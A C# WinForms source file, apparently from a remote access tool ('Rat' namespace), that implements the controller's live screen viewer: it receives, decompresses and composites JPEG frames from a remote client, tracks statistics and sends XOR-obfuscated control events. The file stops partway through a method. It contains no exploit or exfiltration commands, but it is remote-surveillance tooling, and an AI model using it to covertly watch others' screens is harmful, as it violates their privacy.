using DevExpress.XtraEditors;
using HPSocket;
using SharpCompress.Compressors;
using SharpCompress.Compressors.Deflate;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Rat.用户管理.屏幕管理2
{
    public partial class 高速屏幕界面 : DevExpress.XtraEditors.XtraForm
    {        
        // 管理不同连接的窗体实例
        public static readonly Dictionary<string, 高速屏幕界面> _forms = new Dictionary<string, 高速屏幕界面>();
        // 静态同步上下文
        public static SynchronizationContext _uiContext;
        // 连接信息
        private IntPtr _connId;
        private IServer _sender;
        private ushort _port;

        // 屏幕信息
        private int _screenWidth = 0;
        private int _screenHeight = 0;
        private int _bitDepth = 0;

        // 当前显示的位图
        private Bitmap _currentBitmap;

        // FPS统计
        private int _frameCount = 0;
        private float _currentFps = 0f;
        private readonly Stopwatch _fpsStopwatch;

        // 画质和帧率设置
        private int _currentQuality = SCREEN2_CONSTANTS.DEFAULT_JPEG_QUALITY;
        private int _targetFps = SCREEN2_CONSTANTS.DEFAULT_FPS;  // 修复：重命名为 _targetFps

        private readonly object _bitmapLock = new object();
        private readonly object _decodeBitmapLock = new object();
        private readonly object _decodeWorkerLock = new object();
        private readonly AutoResetEvent _decodeSignal = new AutoResetEvent(false);
        private Thread _decodeThread;
        private bool _decodeWorkerStarted = false;
        private volatile bool _decodeStopping = false;
        private Bitmap _decodeBitmap;
        private readonly object _uiBitmapQueueLock = new object();
        private PendingUiBitmap _pendingUiBitmap;
        private bool _uiBitmapApplyQueued = false;
        private int _uiBitmapGeneration = 0;

        private readonly object _frameQueueLock = new object();
        private readonly Queue<PendingFrame> _pendingFrames = new Queue<PendingFrame>();
        private const int MAX_PENDING_FRAMES = 5;
        private const int STATS_REPORT_INTERVAL_MS = 5000;
        private bool _framePumpScheduled = false;
        private bool _resyncPending = false;
        private bool _resyncRequestQueued = false;
        private readonly object _statsLock = new object();
        private readonly Stopwatch _statsStopwatch = new Stopwatch();
        private long _statsFirstFrames;
        private long _statsNextFrames;
        private long _statsOriginalBytes;
        private long _statsCompressedBytes;
        private long _statsProcessMs;
        private long _statsZlibMs;
        private long _statsImageMs;
        private long _statsComposeMs;
        private long _statsQueueDelayMs;
        private long _statsFailures;
        private long _statsResyncs;
        private long _statsBudgetWarnings;
        private long _statsAckSent;
        private long _statsAckFailed;
        private long _statsUiPosts;
        private long _statsUiDrops;
        private long _statsUiApplies;
        private int _statsMaxPendingFrames;
        private int _statsMaxRectCount;
        private int _statsMaxPacketBytes;
        private long _statsMaxProcessMs;
        private long _statsMaxQueueDelayMs;
        private ulong _statsLastSequence;
        private ulong _statsLastBaseSequence;
        private uint _statsLastFrameType;
        private uint _statsLastFlags;
        private int _statsLastRectCount;
        private int _statsLastPayloadSize;
        private ulong _lastDecodedSequence = 0;

        private sealed class PendingFrame
        {
            public SCREEN_FRAME_V2 Header;
            public byte[] CompressedData;
            public long EnqueuedTicks;
        }

        private sealed class PendingUiBitmap
        {
            public Bitmap Bitmap;
            public int Generation;
        }

        private static string FormatV2Header(SCREEN_FRAME_V2 header)
        {
            return $"seq={header.sequence}, baseSeq={header.baseSequence}, frameType={header.frameType}, flags={header.flags}, rectCount={header.rectCount}, payloadSize={header.payloadSize}";
        }

        public 高速屏幕界面(IntPtr connId, IServer sender, ushort port)
        {
            InitializeComponent();

            _connId = connId;
            _sender = sender;
            _port = port;

            _fpsStopwatch = new Stopwatch();
            _fpsStopwatch.Start();
            _statsStopwatch.Start();
        }

        public static 高速屏幕界面 GetForm(IntPtr connId, IServer sender, ushort port)
        {
            // 确保在主线程操作
            if (Application.OpenForms["Form1"]?.InvokeRequired ?? false)
            {
                return (高速屏幕界面)Application.OpenForms["Form1"].Invoke(
                    new Func<高速屏幕界面>(() => GetForm(connId, sender, port)));
            }

            string formKey = $"SCREEN2_{connId}_{port}";
            if (!_forms.TryGetValue(formKey, out var form))
            {
                form = new 高速屏幕界面(connId, sender, port);
                form.Name = formKey;
                _forms.Add(formKey, form);
            }
            return form;
        }

        public static bool TryGetForm(IntPtr connId, ushort port, out 高速屏幕界面 form)
        {
            // 只查询，不创建窗口。避免请求高速屏幕时提前创建隐藏窗口。
            if (Application.OpenForms["Form1"]?.InvokeRequired ?? false)
            {
                form = (高速屏幕界面)Application.OpenForms["Form1"].Invoke(
                    new Func<高速屏幕界面>(() =>
                    {
                        string key = $"SCREEN2_{connId}_{port}";
                        _forms.TryGetValue(key, out var existingForm);
                        return existingForm;
                    }));
                return form != null;
            }

            string formKey = $"SCREEN2_{connId}_{port}";
            return _forms.TryGetValue(formKey, out form);
        }

        private void 高速屏幕界面_Load(object sender, EventArgs e)
        {
            // 保存UI上下文
            _uiContext = SynchronizationContext.Current;

            // UI体验：减少闪烁、让预览区域更"干净"
            this.DoubleBuffered = true;
            pictureEdit1.Properties.Appearance.BackColor = Color.Black;
            pictureEdit1.Properties.Appearance.Options.UseBackColor = true;
            pictureEdit1.Properties.BorderStyle = DevExpress.XtraEditors.Controls.BorderStyles.NoBorder;

            // 配置PictureEdit
            pictureEdit1.Properties.ShowMenu = false;
            pictureEdit1.Properties.SizeMode = DevExpress.XtraEditors.Controls.PictureSizeMode.Zoom;

            // 初始化质量和帧率下拉框
            comboBoxQuality.Properties.Items.Clear();
            comboBoxQuality.Properties.Items.AddRange(new string[] { "60", "85", "100" });

            comboBoxFps.Properties.Items.Clear();
            comboBoxFps.Properties.Items.AddRange(new string[] { "5", "10", "15", "20", "30", "60" });

            // 临时取消事件订阅，避免初始化时触发
            comboBoxQuality.SelectedIndexChanged -= comboBoxQuality_SelectedIndexChanged;
            comboBoxFps.SelectedIndexChanged -= comboBoxFps_SelectedIndexChanged;

            // 设置默认值
            comboBoxQuality.SelectedIndex = 1; // 默认85
            comboBoxFps.SelectedIndex = 1;     // 默认10

            // 保存到成员变量
            _currentQuality = int.Parse(comboBoxQuality.SelectedItem.ToString());
            _targetFps = int.Parse(comboBoxFps.SelectedItem.ToString());

            // 恢复事件订阅
            comboBoxQuality.SelectedIndexChanged += comboBoxQuality_SelectedIndexChanged;
            comboBoxFps.SelectedIndexChanged += comboBoxFps_SelectedIndexChanged;

            // Load 只初始化 UI。捕获启动由 SCREEN2_RET_OPEN 打开窗口后延迟触发，
            // 避免插件初始化/事件路由尚未稳定时过早发送启动捕获事件。
            btnStart.Enabled = true;
            btnStop.Enabled = false;

            // 启动FPS更新定时器
            timer1.Interval = 1000; // 1秒
            timer1.Tick += Timer1_Tick;
            timer1.Start();
        }

        private void 高速屏幕界面_FormClosed(object sender, FormClosedEventArgs e)
        {
            MaybeReportFrameStats(true);
            StopDecodeWorker();

            // 停止定时器
            timer1.Stop();
            timer1.Tick -= Timer1_Tick;

            // 发送关闭事件
            SendEvent(SCREEN2_EVENT_ID.DLG_CLOSE);

            // 移除操作状态
            UserInfoList.RemoveOperationStatus(_connId, _port, OperationStatusFlags.quickscreen);

            lock (_frameQueueLock)
            {
                _pendingFrames.Clear();
                _framePumpScheduled = false;
                _resyncPending = false;
                _resyncRequestQueued = false;
                _lastDecodedSequence = 0;
            }

            // 释放位图
            Bitmap bitmapToDispose;
            lock (_bitmapLock)
            {
                bitmapToDispose = _currentBitmap;
                _currentBitmap = null;
                pictureEdit1.Image = null;
            }
            bitmapToDispose?.Dispose();
            ClearPendingUiBitmap();
            ClearDecodeBitmap();

            // 从字典中移除
            string formKey = $"SCREEN2_{_connId}_{_port}";
            if (_forms.ContainsKey(formKey))
            {
                _forms.Remove(formKey);
            }
        }

        private static void HandleGlobalCloseRequest(object sender, UserConnectionEventArgs e)
        {
            var formsToClose = new List<高速屏幕界面>();

            foreach (var form in _forms.Values)
            {
                if (form._connId == e.connid && form._port == e.port)
                {
                    formsToClose.Add(form);
                }
            }

            foreach (var form in formsToClose)
            {
                if (form.InvokeRequired)
                {
                    form.Invoke(new Action(() => form.Close()));
                }
                else
                {
                    form.Close();
                }
            }
        }

        private void EnsureDecodeWorkerStarted()
        {
            lock (_decodeWorkerLock)
            {
                if (_decodeWorkerStarted)
                {
                    return;
                }

                _decodeStopping = false;
                _decodeThread = new Thread(DecodeFrameLoop);
                _decodeThread.IsBackground = true;
                _decodeThread.Name = $"SCREEN2_DECODE_{_connId}_{_port}";
                _decodeThread.Start();
                _decodeWorkerStarted = true;
            }
        }

        private void StopDecodeWorker()
        {
            Thread threadToJoin;
            _decodeStopping = true;
            _decodeSignal.Set();
            lock (_decodeWorkerLock)
            {
                threadToJoin = _decodeThread;
            }

            if (threadToJoin != null && threadToJoin != Thread.CurrentThread && !threadToJoin.Join(1000))
            {
                Console.WriteLine($"[高速屏幕] 后台解码线程停止等待超时: connId={_connId}, port={_port}");
            }
        }

        private void ClearDecodeBitmap()
        {
            Bitmap bitmapToDispose = null;
            lock (_decodeBitmapLock)
            {
                bitmapToDispose = _decodeBitmap;
                _decodeBitmap = null;
            }
            bitmapToDispose?.Dispose();
        }

        private void ClearPendingUiBitmap()
        {
            Bitmap bitmapToDispose = null;
            lock (_uiBitmapQueueLock)
            {
                bitmapToDispose = _pendingUiBitmap?.Bitmap;
                _pendingUiBitmap = null;
                _uiBitmapApplyQueued = false;
                _uiBitmapGeneration++;
            }
            bitmapToDispose?.Dispose();
        }

        private void RequestDecodeResync(string reason)
        {
            lock (_frameQueueLock)
            {
                _pendingFrames.Clear();
                _resyncPending = true;
                _resyncRequestQueued = true;
                _framePumpScheduled = true;
                _lastDecodedSequence = 0;
            }

            ClearPendingUiBitmap();
            RecordFrameResync();
            Console.WriteLine($"[高速屏幕] {reason}，请求首帧重同步");
            EnsureDecodeWorkerStarted();
            _decodeSignal.Set();
        }

        private void PostStartCapture()
        {
            if (IsDisposed || !IsHandleCreated)
            {
                return;
            }

            try
            {
                BeginInvoke(new Action(StartCapture));
            }
            catch (ObjectDisposedException)
            {
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void PostDecodedBitmap(Bitmap bitmap)
        {
            if (bitmap == null)
            {
                return;
            }

            Bitmap droppedBitmap = null;
            bool shouldSchedule = false;
            lock (_uiBitmapQueueLock)
            {
                if (_decodeStopping || IsDisposed || !IsHandleCreated)
                {
                    droppedBitmap = bitmap;
                }
                else
                {
                    droppedBitmap = _pendingUiBitmap?.Bitmap;
                    _pendingUiBitmap = new PendingUiBitmap
                    {
                        Bitmap = bitmap,
                        Generation = _uiBitmapGeneration
                    };
                    if (!_uiBitmapApplyQueued)
                    {
                        _uiBitmapApplyQueued = true;
                        shouldSchedule = true;
                    }
                }
            }

            bool droppedPrevious = droppedBitmap != null && !object.ReferenceEquals(droppedBitmap, bitmap);
            droppedBitmap?.Dispose();
            RecordUiBitmapPost(droppedPrevious);

            if (shouldSchedule)
            {
                SchedulePendingUiBitmapApply();
            }
        }

        private void SchedulePendingUiBitmapApply()
        {
            if (_decodeStopping || IsDisposed || !IsHandleCreated)
            {
                ClearPendingUiBitmap();
                return;
            }

            try
            {
                BeginInvoke(new Action(ApplyPendingDecodedBitmap));
            }
            catch (ObjectDisposedException)
            {
                ClearPendingUiBitmap();
            }
            catch (InvalidOperationException)
            {
                ClearPendingUiBitmap();
            }
        }

        private void ApplyPendingDecodedBitmap()
        {
            PendingUiBitmap pending = null;
            lock (_uiBitmapQueueLock)
            {
                pending = _pendingUiBitmap;
                _pendingUiBitmap = null;
            }

            if (pending != null)
            {
                ApplyDecodedBitmap(pending.Bitmap, pending.Generation);
            }

            bool scheduleAgain = false;
            lock (_uiBitmapQueueLock)
            {
                if (_pendingUiBitmap != null && !_decodeStopping && !IsDisposed && IsHandleCreated)
                {
                    scheduleAgain = true;
                }
                else
                {
                    _uiBitmapApplyQueued = false;
                }
            }

            if (scheduleAgain)
            {
                SchedulePendingUiBitmapApply();
            }
        }

        private void ApplyDecodedBitmap(Bitmap bitmap, int generation)
        {
            if (bitmap == null)
            {
                return;
            }
            bool staleGeneration;
            lock (_uiBitmapQueueLock)
            {
                staleGeneration = generation != _uiBitmapGeneration;
            }
            if (_decodeStopping || IsDisposed)
            {
                bitmap.Dispose();
                return;
            }
            if (staleGeneration)
            {
                bitmap.Dispose();
                return;
            }

            Bitmap oldBitmap;
            lock (_bitmapLock)
            {
                oldBitmap = _currentBitmap;
                _currentBitmap = bitmap;
                pictureEdit1.Image = null;
                pictureEdit1.Image = _currentBitmap;
            }
            oldBitmap?.Dispose();
            UpdateFps();
            RecordUiBitmapApply();
        }

        /// <summary>
        /// 发送事件到客户端
        /// </summary>
        private bool SendEvent(SCREEN2_EVENT_ID eventId, int value = 0)
        {
            if (_sender == null)
            {
                return false;
            }

            var builder = new PacketBuilder().SetHeader(
                AgreementMSG.PLUGIN_EVENT,
                (int)PLUGIN_MOUDEL_TYPE.quickscreen,
                (int)eventId);

            if (value != 0)
            {
                var data = new DATA_STRUCT();
                data.value_int = value;
                builder.AddData(data);
            }

            byte[] finalPacket = builder.Build();
            byte[] encryptedData = Xor.XorEncryptDecrypt(finalPacket);
            return _sender.Send(_connId, encryptedData, encryptedData.Length);
        }

        private void SendFrameAck()
        {
            bool sent = SendEvent(SCREEN2_EVENT_ID.FRAME_ACK);
            RecordFrameAckSend(sent);
            if (!sent)
            {
                Console.WriteLine($"[高速屏幕] FRAME_ACK发送失败: connId={_connId}, port={_port}");
            }
        }

        private void RecordQueueStats(int pendingFrames, long queueDelayMs)
        {
            lock (_statsLock)
            {
                if (pendingFrames > _statsMaxPendingFrames)
                {
                    _statsMaxPendingFrames = pendingFrames;
                }
                _statsQueueDelayMs += queueDelayMs;
                if (queueDelayMs > _statsMaxQueueDelayMs)
                {
                    _statsMaxQueueDelayMs = queueDelayMs;
                }
            }
        }

        private void RecordFrameProcessStats(bool isFirstFrame, SCREEN_FRAME_V2 header, int originalSize, int compressedSize,
            int rectCount, long processMs, long zlibMs, long imageMs, long composeMs)
        {
            lock (_statsLock)
            {
                if (isFirstFrame)
                {
                    _statsFirstFrames++;
                }
                else
                {
                    _statsNextFrames++;
                }
                _statsOriginalBytes += originalSize;
                _statsCompressedBytes += compressedSize;
                _statsProcessMs += processMs;
                _statsZlibMs += zlibMs;
                _statsImageMs += imageMs;
                _statsComposeMs += composeMs;
                if (rectCount > _statsMaxRectCount)
                {
                    _statsMaxRectCount = rectCount;
                }
                int headerSize = Marshal.SizeOf<SCREEN_FRAME_V2>();
                int totalPacketSize = headerSize + compressedSize;
                if (totalPacketSize > _statsMaxPacketBytes)
                {
                    _statsMaxPacketBytes = totalPacketSize;
                }
                if (totalPacketSize >= SCREEN2_CONSTANTS.MAX_FRAME_PACKET_SIZE)
                {
                    _statsBudgetWarnings++;
                }
                if (processMs > _statsMaxProcessMs)
                {
                    _statsMaxProcessMs = processMs;
                }
                _statsLastSequence = header.sequence;
                _statsLastBaseSequence = header.baseSequence;
                _statsLastFrameType = header.frameType;
                _statsLastFlags = header.flags;
                _statsLastRectCount = header.rectCount;
                _statsLastPayloadSize = header.payloadSize;
            }

            MaybeReportFrameStats(false);
        }

        private void RecordFrameProcessFailure()
        {
            lock (_statsLock)
            {
                _statsFailures++;
            }
            MaybeReportFrameStats(false);
        }

        private void RecordFrameResync()
        {
            lock (_statsLock)
            {
                _statsResyncs++;
            }
            MaybeReportFrameStats(false);
        }

        private void RecordFrameAckSend(bool sent)
        {
            lock (_statsLock)
            {
                if (sent)
                {
                    _statsAckSent++;
                }
                else
                {
                    _statsAckFailed++;
                }
            }
            MaybeReportFrameStats(false);
        }

        private void RecordUiBitmapPost(bool droppedPrevious)
        {
            lock (_statsLock)
            {
                _statsUiPosts++;
                if (droppedPrevious)
                {
                    _statsUiDrops++;
                }
            }
            MaybeReportFrameStats(false);
        }

        private void RecordUiBitmapApply()
        {
            lock (_statsLock)
            {
                _statsUiApplies++;
            }
            MaybeReportFrameStats(false);
        }

        private void MaybeReportFrameStats(bool force)
        {
            if (!force && _statsStopwatch.ElapsedMilliseconds < STATS_REPORT_INTERVAL_MS)
            {
                return;
            }

            long firstFrames;
            long nextFrames;
            long originalBytes;
            long compressedBytes;
            long processMs;
            long zlibMs;
            long imageMs;
            long composeMs;
            long queueDelayMs;
            long failures;
            long resyncs;
            long budgetWarnings;
            long ackSent;
            long ackFailed;
            long uiPosts;
            long uiDrops;
            long uiApplies;
            long intervalMs;
            int maxPending;
            int maxRectCount;
            int maxPacketBytes;
            long maxProcessMs;
            long maxQueueDelayMs;
            ulong lastSequence;
            ulong lastBaseSequence;
            uint lastFrameType;
            uint lastFlags;
            int lastRectCount;
            int lastPayloadSize;

            lock (_statsLock)
            {
                firstFrames = _statsFirstFrames;
                nextFrames = _statsNextFrames;
                originalBytes = _statsOriginalBytes;
                compressedBytes = _statsCompressedBytes;
                processMs = _statsProcessMs;
                zlibMs = _statsZlibMs;
                imageMs = _statsImageMs;
                composeMs = _statsComposeMs;
                queueDelayMs = _statsQueueDelayMs;
                failures = _statsFailures;
                resyncs = _statsResyncs;
                budgetWarnings = _statsBudgetWarnings;
                ackSent = _statsAckSent;
                ackFailed = _statsAckFailed;
                uiPosts = _statsUiPosts;
                uiDrops = _statsUiDrops;
                uiApplies = _statsUiApplies;
                intervalMs = Math.Max(1, _statsStopwatch.ElapsedMilliseconds);
                maxPending = _statsMaxPendingFrames;
                maxRectCount = _statsMaxRectCount;
                maxPacketBytes = _statsMaxPacketBytes;
                maxProcessMs = _statsMaxProcessMs;
                maxQueueDelayMs = _statsMaxQueueDelayMs;
                lastSequence = _statsLastSequence;
                lastBaseSequence = _statsLastBaseSequence;
                lastFrameType = _statsLastFrameType;
                lastFlags = _statsLastFlags;
                lastRectCount = _statsLastRectCount;
                lastPayloadSize = _statsLastPayloadSize;

                _statsFirstFrames = 0;
                _statsNextFrames = 0;
                _statsOriginalBytes = 0;
                _statsCompressedBytes = 0;
                _statsProcessMs = 0;
                _statsZlibMs = 0;
                _statsImageMs = 0;
                _statsComposeMs = 0;
                _statsQueueDelayMs = 0;
                _statsFailures = 0;
                _statsResyncs = 0;
                _statsBudgetWarnings = 0;
                _statsAckSent = 0;
                _statsAckFailed = 0;
                _statsUiPosts = 0;
                _statsUiDrops = 0;
                _statsUiApplies = 0;
                _statsMaxPendingFrames = 0;
                _statsMaxRectCount = 0;
                _statsMaxPacketBytes = 0;
                _statsMaxProcessMs = 0;
                _statsMaxQueueDelayMs = 0;
                _statsLastSequence = 0;
                _statsLastBaseSequence = 0;
                _statsLastFrameType = 0;
                _statsLastFlags = 0;
                _statsLastRectCount = 0;
                _statsLastPayloadSize = 0;
                _statsStopwatch.Restart();
            }

            long frames = firstFrames + nextFrames;
            if (frames == 0 && failures == 0 && resyncs == 0 && ackSent == 0 && ackFailed == 0 &&
                uiPosts == 0 && uiDrops == 0 && uiApplies == 0)
            {
                return;
            }

            long avgProcessMs = frames > 0 ? processMs / frames : 0;
            long avgZlibMs = frames > 0 ? zlibMs / frames : 0;
            long avgImageMs = frames > 0 ? imageMs / frames : 0;
            long avgComposeMs = frames > 0 ? composeMs / frames : 0;
            long avgQueueDelayMs = frames > 0 ? queueDelayMs / frames : 0;
            long bytesPerSec = intervalMs > 0 ? compressedBytes * 1000 / intervalMs : 0;
            Console.WriteLine($"[SCREEN2_STATS][server] first={firstFrames}, next={nextFrames}, raw={originalBytes}, comp={compressedBytes}, bps={bytesPerSec}, avgProcessMs={avgProcessMs}, maxProcessMs={maxProcessMs}, avgZlibMs={avgZlibMs}, avgImageMs={avgImageMs}, avgComposeMs={avgComposeMs}, avgQueueDelayMs={avgQueueDelayMs}, maxQueueDelayMs={maxQueueDelayMs}, maxPending={maxPending}, maxRects={maxRectCount}, maxPacket={maxPacketBytes}, budgetWarn={budgetWarnings}, failures={failures}, resyncs={resyncs}, ackSent={ackSent}, ackFailed={ackFailed}, uiPost={uiPosts}, uiDrop={uiDrops}, uiApply={uiApplies}, seq={lastSequence}, baseSeq={lastBaseSequence}, frameType={lastFrameType}, flags={lastFlags}, rectCount={lastRectCount}, payloadSize={lastPayloadSize}, packetBudget={SCREEN2_CONSTANTS.MAX_FRAME_PACKET_SIZE}");
        }

        /// <summary>
        /// 处理屏幕打开消息
        /// </summary>
        public void OnScreenOpen(SCREEN_OPEN_MSG msg)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<SCREEN_OPEN_MSG>(OnScreenOpen), msg);
                return;
            }

            _screenWidth = msg.screenWidth;
            _screenHeight = msg.screenHeight;
            _bitDepth = msg.bitDepth;

            labelStatus.Text = $"屏幕: {_screenWidth}x{_screenHeight} @ {_bitDepth}位";
        }

        /// <summary>
        /// 处理屏幕尺寸消息
        /// </summary>
        public void OnScreenSize(SCREEN_SIZE_MSG msg)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<SCREEN_SIZE_MSG>(OnScreenSize), msg);
                return;
            }

            _screenWidth = msg.width;
            _screenHeight = msg.height;

            labelStatus.Text = $"屏幕: {_screenWidth}x{_screenHeight} @ 虚拟({msg.virtualX}, {msg.virtualY})";
        }

        /// <summary>
        /// 处理 V2 帧（full/keyframe 或 diff）
        /// </summary>
        public void OnFrameV2(SCREEN_FRAME_V2 header, byte[] compressedData)
        {
            EnqueueFrame(new PendingFrame
            {
                Header = header,
                CompressedData = compressedData
            });
        }

        private void EnqueueFrame(PendingFrame frame)
        {
            if (frame == null || frame.CompressedData == null || IsDisposed)
            {
                return;
            }

            int pendingDepth = 0;
            frame.EnqueuedTicks = Stopwatch.GetTimestamp();
            lock (_frameQueueLock)
            {
                if (frame.Header.frameType == SCREEN2_CONSTANTS.FRAME_TYPE_FULL)
                {
                    _pendingFrames.Clear();
                    _resyncPending = false;
                    _resyncRequestQueued = false;
                    _lastDecodedSequence = 0;
                    _pendingFrames.Enqueue(frame);
                    pendingDepth = _pendingFrames.Count;
                }
                else
                {
                    if (_resyncPending)
                    {
                        return;
                    }

                    if (_pendingFrames.Count >= MAX_PENDING_FRAMES)
                    {
                        _pendingFrames.Clear();
                        _resyncPending = true;
                        _resyncRequestQueued = true;
                        _lastDecodedSequence = 0;
                        RecordFrameResync();
                        Console.WriteLine("[高速屏幕] 解码帧队列积压，丢弃差异帧并请求首帧重同步");
                    }
                    else
                    {
                        _pendingFrames.Enqueue(frame);
                        pendingDepth = _pendingFrames.Count;
                    }
                }

                if (!_framePumpScheduled)
                {
                    _framePumpScheduled = true;
                }
            }

            if (pendingDepth > 0)
            {
                RecordQueueStats(pendingDepth, 0);
            }

            EnsureDecodeWorkerStarted();
            _decodeSignal.Set();
        }

        private void DecodeFrameLoop()
        {
            while (!_decodeStopping)
            {
                _decodeSignal.WaitOne();
                if (_decodeStopping)
                {
                    break;
                }

                while (!_decodeStopping)
                {
                    PendingFrame frame = null;
                    bool requestResync = false;
                    int pendingAfterDequeue = 0;
                    lock (_frameQueueLock)
                    {
                        if (_resyncRequestQueued)
                        {
                            requestResync = true;
                            _resyncRequestQueued = false;
                            _pendingFrames.Clear();
                            _lastDecodedSequence = 0;
                        }
                        else if (_pendingFrames.Count > 0)
                        {
                            frame = _pendingFrames.Dequeue();
                            pendingAfterDequeue = _pendingFrames.Count;
                        }
                        else
                        {
                            _framePumpScheduled = false;
                            break;
                        }
                    }

                    if (requestResync)
                    {
                        SendEvent(SCREEN2_EVENT_ID.RESET_SCREEN);
                        PostStartCapture();
                        continue;
                    }

                    if (frame != null)
                    {
                        long queueDelayMs = 0;
                        if (frame.EnqueuedTicks > 0)
                        {
                            queueDelayMs = (Stopwatch.GetTimestamp() - frame.EnqueuedTicks) * 1000 / Stopwatch.Frequency;
                        }
                        RecordQueueStats(pendingAfterDequeue, queueDelayMs);
                        try
                        {
                            if (frame.Header.frameType == SCREEN2_CONSTANTS.FRAME_TYPE_FULL)
                            {
                                ProcessFirstFrameV2(frame.Header, frame.CompressedData);
                            }
                            else
                            {
                                ProcessNextFrameV2(frame.Header, frame.CompressedData);
                            }
                        }
                        finally
                        {
                            SendFrameAck();
                        }
                    }
                }
            }
        }

        private void ProcessFirstFrameV2(SCREEN_FRAME_V2 header, byte[] compressedData)
        {
            var processWatch = Stopwatch.StartNew();
            long zlibMs = 0;
            long imageMs = 0;
            long composeMs = 0;
            try
            {
                if (header.sequence == 0 || header.baseSequence != 0 || header.rectCount != 0)
                {
                    Console.WriteLine($"[高速屏幕] V2第一帧头非法: {FormatV2Header(header)}");
                    RecordFrameProcessFailure();
                    RequestDecodeResync("V2第一帧头非法");
                    return;
                }

                var stageWatch = Stopwatch.StartNew();
                byte[] decompressedData = DecompressZlib(compressedData, header.originalSize);
                zlibMs = stageWatch.ElapsedMilliseconds;
                if (decompressedData == null || decompressedData.Length != header.originalSize)
                {
                    Console.WriteLine($"[高速屏幕] 第一帧解压失败或长度不匹配: expected={header.originalSize}, actual={decompressedData?.Length ?? 0}, {FormatV2Header(header)}");
                    RecordFrameProcessFailure();
                    RequestDecodeResync("第一帧解压失败");
                    return;
                }

                Bitmap newBitmap;
                stageWatch.Restart();
                using (var ms = new MemoryStream(decompressedData))
                using (var decodedBitmap = new Bitmap(ms))
                {
                    // 复制为独立 Bitmap，避免 Bitmap 生命周期依赖已释放的 MemoryStream。
                    newBitmap = new Bitmap(decodedBitmap);
                }
                imageMs = stageWatch.ElapsedMilliseconds;

                Bitmap oldDecodeBitmap;
                Bitmap uiBitmap;
                stageWatch.Restart();
                lock (_decodeBitmapLock)
                {
                    if (_decodeStopping)
                    {
                        newBitmap.Dispose();
                        return;
                    }
                    oldDecodeBitmap = _decodeBitmap;
                    _decodeBitmap = newBitmap;
                    uiBitmap = new Bitmap(_decodeBitmap);
                }
                composeMs = stageWatch.ElapsedMilliseconds;

                oldDecodeBitmap?.Dispose();
                _lastDecodedSequence = header.sequence;
                if (_decodeStopping)
                {
                    uiBitmap.Dispose();
                    return;
                }
                PostDecodedBitmap(uiBitmap);
                RecordFrameProcessStats(true, header, header.originalSize, compressedData.Length, 0,
                    processWatch.ElapsedMilliseconds, zlibMs, imageMs, composeMs);
            }
            catch (Exception ex)
            {
                RecordFrameProcessFailure();
                RequestDecodeResync("第一帧后台解码失败");
                Console.WriteLine($"[高速屏幕] 解析第一帧失败: {ex.Message}, {FormatV2Header(header)}");
            }
        }

        private void ProcessNextFrameV2(SCREEN_FRAME_V2 header, byte[] compressedData)
        {
            var processWatch = Stopwatch.StartNew();
            long zlibMs = 0;
            long composeMs = 0;
            try
            {
                if (header.sequence == 0 || header.sequence <= _lastDecodedSequence || header.baseSequence != _lastDecodedSequence)
                {
                    Console.WriteLine($"[高速屏幕] V2差异帧序号不连续: expectedBase={_lastDecodedSequence}, {FormatV2Header(header)}");
                    RecordFrameProcessFailure();
                    RequestDecodeResync("V2差异帧序号不连续");
                    return;
                }

                var stageWatch = Stopwatch.StartNew();
                byte[] decompressedData = DecompressZlib(compressedData, header.originalSize);
                zlibMs = stageWatch.ElapsedMilliseconds;
                if (decompressedData == null || decompressedData.Length != header.originalSize)
                {
                    Console.WriteLine($"[高速屏幕] 差异帧解压失败或长度不匹配: expected={header.originalSize}, actual={decompressedData?.Length ?? 0}, {FormatV2Header(header)}");
                    RecordFrameProcessFailure();
                    RequestDecodeResync("差异帧解压失败");
                    return;
                }

                if (header.rectCount <= 0 || header.rectCount > SCREEN2_CONSTANTS.MAX_V2_FRAME_RECTS)
                {
                    Console.WriteLine($"[高速屏幕] 差异帧区域数非法: {FormatV2Header(header)}");
                    RecordFrameProcessFailure();
                    RequestDecodeResync("差异帧区域数非法");
                    return;
                }

                stageWatch.Restart();
                Bitmap uiBitmap = null;
                bool missingBaseFrame = false;
                lock (_decodeBitmapLock)
                {
                    if (_decodeStopping)
                    {
                        return;
                    }
                    if (_decodeBitmap == null)
                    {
                        Console.WriteLine($"[高速屏幕] 没有基础帧，无法应用差异: {FormatV2Header(header)}");
                        RecordFrameProcessFailure();
                        missingBaseFrame = true;
                    }
                    else
                    {
                        using (var ms = new MemoryStream(decompressedData))
                        using (var graphics = Graphics.FromImage(_decodeBitmap))
                        {
                            graphics.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
                            graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed;
                            graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;

                            int rectHeaderSize = Marshal.SizeOf<CHANGED_RECT_DATA>();
                            byte[] rectHeaderBytes = new byte[rectHeaderSize];
                            for (int i = 0; i < header.rectCount; i++)
                            {
                                if (ms.Length - ms.Position < rectHeaderSize)
                                {
                                    throw new InvalidDataException($"差异帧矩形头不足: index={i}, remaining={ms.Length - ms.Position}");
                                }

                                if (ms.Read(rectHeaderBytes, 0, rectHeaderBytes.Length) != rectHeaderBytes.Length)
                                {
                                    throw new InvalidDataException($"差异帧矩形头读取失败: index={i}");
                                }

                                GCHandle handle = GCHandle.Alloc(rectHeaderBytes, GCHandleType.Pinned);
                                CHANGED_RECT_DATA rectData;
                                try
                                {
                                    rectData = Marshal.PtrToStructure<CHANGED_RECT_DATA>(handle.AddrOfPinnedObject());
                                }
                                finally
                                {
                                    handle.Free();
                                }

                                int rectWidth = rectData.rect.right - rectData.rect.left;
                                int rectHeight = rectData.rect.bottom - rectData.rect.top;
                                if (rectData.jpegSize <= 0 || rectData.jpegSize > ms.Length - ms.Position)
                                {
                                    throw new InvalidDataException($"差异帧JPEG大小非法: index={i}, jpegSize={rectData.jpegSize}, remaining={ms.Length - ms.Position}");
                                }
                                if (rectWidth <= 0 || rectHeight <= 0 ||
                                    rectData.rect.left < 0 || rectData.rect.top < 0 ||
                                    rectData.rect.right > _decodeBitmap.Width || rectData.rect.bottom > _decodeBitmap.Height)
                                {
                                    throw new InvalidDataException($"差异帧矩形越界: index={i}, rect=({rectData.rect.left},{rectData.rect.top},{rectData.rect.right},{rectData.rect.bottom})");
                                }

